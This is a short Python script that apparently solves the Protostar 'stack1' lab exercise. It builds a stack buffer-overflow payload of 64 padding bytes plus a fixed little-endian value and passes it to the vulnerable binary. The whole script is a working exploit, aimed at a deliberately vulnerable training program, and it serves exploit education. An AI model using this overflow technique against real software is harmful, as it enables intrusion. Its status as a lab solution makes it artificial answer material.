
import os

sploit="A"*64 + "\x64\x63\x62\x61"

os.system("/opt/protostar/bin/stack1 %s" % sploit)
